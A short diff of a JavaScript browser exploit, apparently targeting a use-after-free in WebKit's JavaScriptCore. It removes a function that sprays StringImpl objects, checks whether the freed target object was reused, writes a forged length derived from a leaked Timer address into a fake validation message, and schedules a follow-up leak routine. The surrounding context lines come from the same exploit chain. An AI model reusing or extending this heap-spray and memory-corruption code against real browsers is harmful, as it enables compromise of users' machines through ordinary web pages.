@@ -243,6 +243,7 @@ function cleanup() {
  */
 
 
+
 /* Executed after deleteBubbleTree */
 function leakJSC() {
 	debug_log("[+] Looking for the smashed StringImpl...");
@@ -348,24 +349,7 @@ function leakJSC() {
  * Executed after buildBubbleTree
  * and before deleteBubbleTree
  */
-function confuseTargetObjRound1() {
-	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
-	/* Checking for leaked data */
-	if (findTargetObj() === false)
-		die("[!] Failed to reuse target obj.");
-
-	dumpTargetObj();
-
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
-
-	/*
-	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
-	 * the next 5s
-	 */
-	setTimeout(leakJSC, 6000);
-}
 
 function handle2() {
 	/* focus elsewhere */
